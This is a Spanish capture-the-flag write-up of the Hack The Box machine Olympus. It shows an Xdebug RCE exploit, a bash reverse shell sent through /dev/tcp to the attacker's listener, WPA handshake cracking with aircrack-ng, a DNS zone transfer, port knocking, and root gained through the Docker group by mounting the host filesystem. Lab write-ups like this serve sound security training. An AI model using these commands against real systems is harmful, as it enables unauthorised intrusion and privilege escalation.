---
layout: post
title: Olympus
date: 2023-03-14
description:
img:
fig-caption:
tags: [eJPT (Intrusión), eCPPTv2]
---
___

<center><img src="/writeups/assets/img/Olympus-htb/Olympus.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de Xdebug

* Cracking con aircrack-ng

* Pivoting

* User guessing

* Pivoting

* Port Knocking

* Ataque de transferencia de zona

* Abuso del grupo Docker (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.83 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 10:09 GMT
Nmap scan report for 10.10.10.83
Host is up (0.059s latency).
Not shown: 65531 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,80,2222 10.10.10.83 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 10:12 GMT
Nmap scan report for 10.10.10.83
Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
53/tcp   open  domain  (unknown banner: Bind)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    Bind
| dns-nsid: 
|_  bind.version: Bind
80/tcp   open  http    Apache httpd
|_http-title: Crete island - Olympus HTB
|_http-server-header: Apache
2222/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-City of olympia
| ssh-hostkey: 
|   2048 f2badb069500ec0581b0936032fd9e00 (RSA)
|   256 7990c03d436c8d721960453cf89914bb (ECDSA)
|_  256 f85b2e32950312a33b40c51127ca7152 (ED25519)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.93%I=7%D=3/14%Time=6410488C%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,3F,"\0=\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x05\x04Bind\xc0\x0c\
SF:0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.93%I=7%D=3/14%Time=64104887%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"SSH-2\.0-City\x20of\x20olympia\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.96 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.83
http://10.10.10.83 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.10.83], Title[Crete island - Olympus HTB], UncommonHeaders[x-content-type-options,xdebug], X-Frame-Options[sameorigin], X-XSS-Protection[1; mode=block]
```

La página principal solo tiene una foto de fondo

<img src="/writeups/assets/img/Olympus-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas, pero no encuentro nada

```null
gobuster dir -u http://10.10.10.83/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.83/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/14 10:19:24 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 314]
```

Me fijo en las cabeceras de respuesta, y una de ellas corresponde a ```Xdebug```

```null
curl -s -X GET 10.10.10.83 -I
HTTP/1.1 200 OK
Date: Tue, 14 Mar 2023 10:19:54 GMT
Server: Apache
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
Xdebug: 2.5.5
Content-Length: 314
Content-Type: text/html; charset=UTF-8
```

Es vulnerable a una ejecución remota de comandos

```null
searchsploit Xdebug
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
xdebug < 2.5.5 - OS Command Execution (Metasploit)                                                                                                                             | php/remote/44568.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Me descargo un exploit de [Github](https://github.com/D3Ext/XDEBUG-Exploit) y obtengo ejecución remota de comandos

```null
python3 xdebug.py -u http://10.10.10.83/ -l 10.10.16.11

██╗  ██╗██████╗ ███████╗██████╗ ██╗   ██╗ ██████╗ 
╚██╗██╔╝██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝ 
 ╚███╔╝ ██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗   - By D3Ext
 ██╔██╗ ██║  ██║██╔══╝  ██╔══██╗██║   ██║██║   ██║
██╔╝ ██╗██████╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝
╚═╝  ╚═╝╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ 

[+] XDEBUG exploit served on port 9000, waiting for connections
[+] Attempting to trigger the RCE

[+] Exploit triggered successfully
[+] Now you can execute php code, example: system("whoami");
[+] Type quit to exit the shell

[#] Enter php code >> system("ping -c 1 10.10.16.11");
b'round-trip min/avg/max/stddev = 129.311/129.311/129.311/0.000 ms'
```

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:23:38.781509 IP 10.10.10.83 > 10.10.16.11: ICMP echo request, id 58, seq 0, length 64
10:23:38.781528 IP 10.10.16.11 > 10.10.10.83: ICMP echo reply, id 58, seq 0, length 64
```

Me envío una reverse shell

```null
[#] Enter php code >> system("bash -c 'bash -i >& /dev/tcp/10.10.16.11/443 0>&1'");
```

Y la recibo en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.83] 42188
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@f00ba96171c5:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
www-data@f00ba96171c5:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@f00ba96171c5:/var/www/html$ export TERM=xterm
www-data@f00ba96171c5:/var/www/html$ export SHELL=bash
www-data@f00ba96171c5:/var/www/html$ stty rows 55 columns 209
```

Estoy dentro de un contenedor

```null
www-data@f00ba96171c5:/var/www/html$ hostname -I
172.20.0.2 
```

En el directorio personal del usuario ```zeus``` hay un repositorio git

```null
www-data@f00ba96171c5:/home/zeus/airgeddon$ ls -la
total 1100
drwxr-xr-x 1 zeus zeus   4096 Apr  8  2018 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8  2018 ..
-rw-r--r-- 1 zeus zeus    264 Apr  8  2018 .editorconfig
drwxr-xr-x 1 zeus zeus   4096 Apr  8  2018 .git
-rw-r--r-- 1 zeus zeus    230 Apr  8  2018 .gitattributes
drwxr-xr-x 1 zeus zeus   4096 Apr  8  2018 .github
-rw-r--r-- 1 zeus zeus     89 Apr  8  2018 .gitignore
-rw-r--r-- 1 zeus zeus  15855 Apr  8  2018 CHANGELOG.md
-rw-r--r-- 1 zeus zeus   3228 Apr  8  2018 CODE_OF_CONDUCT.md
-rw-r--r-- 1 zeus zeus   6358 Apr  8  2018 CONTRIBUTING.md
-rw-r--r-- 1 zeus zeus   3283 Apr  8  2018 Dockerfile
-rw-r--r-- 1 zeus zeus  34940 Apr  8  2018 LICENSE.md
-rw-r--r-- 1 zeus zeus   4425 Apr  8  2018 README.md
-rw-r--r-- 1 zeus zeus 297711 Apr  8  2018 airgeddon.sh
drwxr-xr-x 1 zeus zeus   4096 Apr  8  2018 binaries
drwxr-xr-x 1 zeus zeus   4096 Apr  8  2018 captured
drwxr-xr-x 1 zeus zeus   4096 Apr  8  2018 imgs
-rw-r--r-- 1 zeus zeus  16315 Apr  8  2018 known_pins.db
-rw-r--r-- 1 zeus zeus 685345 Apr  8  2018 language_strings.sh
-rw-r--r-- 1 zeus zeus     33 Apr  8  2018 pindb_checksum.txt
```

Dentro, una captura de paquetes

```null
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$ ls
captured.cap  papyrus.txt
```

Se trata de un proceso de desautenticación de usuarios en una red Wifi. En caso de que dentro esté almacenado un handshake, se puede intentar crackear por fuerza bruta. El SSID se puede obtener en el primer paquete

<img src="/writeups/assets/img/Olympus-htb/2.png" alt="">

```null
aircrack-ng -e Too_cl0se_to_th3_Sun -w /usr/share/wordlists/rockyou.txt captura.cap

                               Aircrack-ng 1.7 

      [00:08:32] 8176472/14344391 keys tested (16186.86 k/s) 

      Time left: 6 minutes, 21 seconds                          57.00%

                        KEY FOUND! [ flightoficarus ]


      Master Key     : FA C9 FB 75 B7 7E DC 86 CC C0 D5 38 88 75 B8 5A 
                       88 3B 75 31 D9 C3 23 C8 68 3C DB FA 0F 67 3F 48 

      Transient Key  : 46 7D FD D8 1A E5 1A 98 50 C8 DD 13 26 E7 32 7C 
                       DE E7 77 4E 83 03 D9 24 74 81 30 84 AD AD F8 10 
                       21 62 1F 60 15 02 0C 5C 1C 84 60 FA 34 DE C0 4F 
                       35 F6 4F 03 A2 0F 8F 6F 5E 20 05 27 E1 73 E0 73 

      EAPOL HMAC     : AC 1A 73 84 FB BF 75 9C 86 CF 5B 5A F4 8A 4C 38 
```

Esta contraseña corresponde al usuario ```icarus```, sacándolo por intuición pr el SSID y la contraseña (CTF Like). La contraseña es el nombre del SSID

```null
sshpass -p 'Too_cl0se_to_th3_Sun' ssh icarus@10.10.10.83 -p 2222
Last login: Sun Apr 15 16:44:40 2018 from 10.10.14.4
icarus@620b296204a3:~$ 
```

Estoy dentro de otro contenedor

```null
icarus@620b296204a3:~$ hostname -I                                                                                                                                                                              
172.19.0.2
```

En su directorio personal hay un archivo de texto con un dominio

```null
icarus@620b296204a3:~$ cat help_of_the_gods.txt                                                                                                                                                                 

Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb
```

Ahora puedo intentar un ataque de transferencia de zona a través del puerto 53, que estaba abierto externamente

```null
dig @10.10.10.83 ctfolympus.htb axfr

; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.83 ctfolympus.htb axfr
; (1 server found)
;; global options: +cmd
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.		86400	IN	TXT	"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.		86400	IN	A	192.168.0.120
ctfolympus.htb.		86400	IN	NS	ns1.ctfolympus.htb.
ctfolympus.htb.		86400	IN	NS	ns2.ctfolympus.htb.
ctfolympus.htb.		86400	IN	MX	10 mail.ctfolympus.htb.
crete.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
hades.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
mail.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns1.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns2.ctfolympus.htb.	86400	IN	A	192.168.0.120
rhodes.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN	TXT	"Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 223 msec
;; SERVER: 10.10.10.83#53(10.10.10.83) (TCP)
;; WHEN: Tue Mar 14 11:00:39 GMT 2023
;; XFR size: 15 records (messages 1, bytes 475)
```

Obtengo una gran cantidad de subdominos y de IPs. En el segundo, parece que lo que hay entre paréntesis son puertos (3456 8234 62431). Pruebo un Port Knocking

```null
nc -z 10.10.10.83 3456 8234 62431
```

Se abre el puerto 22 de forma temporal

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.83
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 11:04 GMT
Nmap scan report for 10.10.10.83
Host is up (0.070s latency).
Not shown: 62969 closed tcp ports (conn-refused), 2562 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds
```

Puedo ver la primera flag

```null
sshpass -p 'St34l_th3_F1re!' ssh prometheus@10.10.10.83

Welcome to
                            
    )         (             
 ( /(     )   )\ )   (      
 )\()) ( /(  (()/(  ))\ (   
((_)\  )(_))  ((_))/((_))\  
| |(_)((_)_   _| |(_)) ((_) 
| ' \ / _` |/ _` |/ -_)(_-< 
|_||_|\__,_|\__,_|\___|/__/ 
                           
prometheus@olympus:~$ cat user.txt 
f4ef79147d2a02d0d9c7e976830e4590
```

Veo otra nota

```null
prometheus@olympus:~$ cat msg_of_gods.txt 

Only if you serve well to the gods, you'll be able to enter into the

      _                           
 ___ | | _ _ ._ _ _  ___  _ _  ___
/ . \| || | || ' ' || . \| | |<_-<
\___/|_|`_. ||_|_|_||  _/`___|/__/
        <___'       |_|           
```

Tengo varios grupos asignados

```null
prometheus@olympus:~$ id
uid=1000(prometheus) gid=1000(prometheus) groups=1000(prometheus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker)
```

Entre ellos, ```docker```, por lo que me puedo aprovechar de las imágenes existentes para crear un contenedor que monte toda la raíz de la máquina host, abusando de unix socket docker file

```null
prometheus@olympus:/$ find / -name docker.sock 2>/dev/null
/run/docker.sock
```

```null
prometheus@olympus:/$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
crete               latest              31be8149528e        4 years ago         450MB
olympia             latest              2b8904180780        4 years ago         209MB
rodhes              latest              82fbfd61b8c1        4 years ago         215MB
```

```null
prometheus@olympus:/$ docker run -it -v /:/pwned/ olympia chroot /pwned/ bash
root@32af1c268b09:/# ls
bin  boot  dev	etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var	vmlinuz  vmlinuz.old
root@32af1c268b09:/# cd root/
root@32af1c268b09:~# ls
root.txt
root@32af1c268b09:~# cat root.txt 
b3474f547f8261bfa21ce91d7ba59f1d
```